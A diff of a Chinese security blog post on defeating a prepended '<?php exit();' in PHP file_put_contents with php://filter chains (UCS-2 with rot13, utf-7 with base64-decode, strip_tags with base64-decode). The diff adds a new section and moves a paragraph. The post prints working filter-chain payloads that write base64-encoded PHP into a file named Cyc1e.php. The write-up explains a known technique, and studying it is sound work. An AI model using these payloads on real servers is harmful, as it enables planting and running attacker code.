@@ -58,11 +58,10 @@
 <p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403162535114.png" alt></p>
 <p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403162950176.png" alt></p>
 <p>当然这种方法对于前后不同变量也是一样适用的<del>~</del></p>
-<h2 id="0x04-组合拳"><a href="#0x04-组合拳" class="headerlink" title="0x04 组合拳"></a>0x04 组合拳</h2><h3 id="第一套连招"><a href="#第一套连招" class="headerlink" title="第一套连招"></a>第一套连招</h3><p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，这里就用UCS-2和rot13举一个例子吧👇</p>
+<h2 id="0x04-组合拳"><a href="#0x04-组合拳" class="headerlink" title="0x04 组合拳"></a>0x04 组合拳</h2><h3 id="第一套连招"><a href="#第一套连招" class="headerlink" title="第一套连招"></a>第一套连招</h3><p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，这里就用UCS-2和rot13举一个例子吧，知道可以这样的意思👇</p>
 <figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">$<span class="attr">a</span> = 'php://filter/<span class="attr">write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc</span> cucvcsa(b;)&gt;?/<span class="attr">resource=Cyc1e.php';</span> <span class="comment">#同样需要补位，这里补了一个x</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403165229869.png" alt></p>
-<p>为何不用string.strip_tags呢？因为rot13转换的同样会被strip_tags方法给删除了，而UCS-2或UCS-4构造的也同样会被strip_tags方法给删除，这里需要找其他的编码方式进行构造，这里做个小tips，由于strip_tags去除的是一个闭合的标签所以<code>?&gt;</code>可以放在我们构造的shell编码前，这样在contents上就直接把shell前的字符去了，只要shell的编码不会被删除，就可以解码回shell写入文件中，本菜懒，就不一个一个过滤器试了<del>~</del></p>
 <h3 id="第二套连招"><a href="#第二套连招" class="headerlink" title="第二套连招"></a>第二套连招</h3><p>前面介绍单独用base64编码是不可行的，那么来一套组合拳是否可以呢？答案肯定是可以的，这里感谢大兄弟<a href="http://yulige.top" target="_blank" rel="noopener">郁离歌</a>提供的方法，通过iconv将utf8编码转为utf7编码，从而把 <strong>=</strong> 给转了，就不会影响到base64的解码了👇</p>
 <figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">$a='php://filter/<span class="built_in">convert</span>.iconv.utf-<span class="number">8.</span>utf-<span class="number">7</span>|<span class="built_in">convert</span>.<span class="built_in">base64</span>-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php'; #<span class="built_in">base64</span>编码前补了AA，原理一样，补齐位数</span><br></pre></td></tr></table></figure>
 
@@ -71,7 +70,13 @@
 
 <p>这样就成功的把 <strong>=</strong> 给转了，base64编码没有受到影响，一样可以正常的解码~</p>
 <p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403193558288.png" alt></p>
-<p>所以对于base64的运用，只要找到一个能把 <strong>=</strong> 转了同时又不影响base64编码后的字符的转码方式即可<del>~</del></p>
+<p>所以对于base64的运用，只要找到一个能把 <strong>=</strong> 转了同时又不影响base64编码后的字符的转码方式即可</p>
+<h3 id="第三套连招"><a href="#第三套连招" class="headerlink" title="第三套连招"></a>第三套连招</h3><p>我们来用一下strip_tags方法&amp;&amp;base64的组合，不过这种方法有局限性，所以之前没写，这个要求服务器是linux系统，Windows上不行，因为前面介绍过strip_tags去除的是完整的标签以及内容，而base64要求中间不能出现 <strong>=</strong> 所以把他们二者组合起来👇</p>
+<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">$a = 'php://filter/write=<span class="built_in">string</span>.strip_tags|<span class="built_in">convert</span>.<span class="built_in">base64</span>-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php';</span><br></pre></td></tr></table></figure>
+
+<p>理解起来也很简单，在文件名前加上<code>?&gt;</code>把<code>&lt;?php exit();</code>闭合，同时 = 也在闭合标签之间，所以利用strip_tags处理的时候直接把<code>&lt;?php ...... ?&gt;</code>内的所有内容都删除了，然后对剩下的部分，也就是<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>进行base64解码，为什么说Windows不行呢，因为Windows不支持文件名中有?、&gt;这类字符。</p>
+<p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403195815117.png" alt="image-20200403195815117"></p>
+<p>为何不用string.strip_tags呢？因为rot13转换的同样会被strip_tags方法给删除了，而UCS-2或UCS-4构造的也同样会被strip_tags方法给删除，所以需要找其他的编码方式进行构造，这里做个小tips，由于strip_tags去除的是一个闭合的标签所以<code>?&gt;</code>可以放在我们构造的shell编码前，这样在contents上就直接把shell前的字符去了，只要shell的编码不会被删除，就可以解码回shell写入文件中，本菜懒，就不一个一个过滤器试了<del>~</del></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单的记录了一下本菜的测试过程，过滤器只用了提到的和常用的，当然<strong>php://filter</strong>还有其他的过滤器是可以用的，不过总结起来说，思路都是一样的，就是如何把<code>&lt;?php exit();</code>给<strong>”吃掉“</strong>，让自己构造的shell可以正常运行，简单总结了这种方法，当然，方法万千，师傅们有好的方法也欢迎分享（白嫖）<del>~</del></p>
 <p>tips：<code>file_put_contents</code>和<code>file_get_contents</code>这两个函数还是很有意思的，file_get_contents也有很多特性，下次有时间再写</p>
 ]]></content>
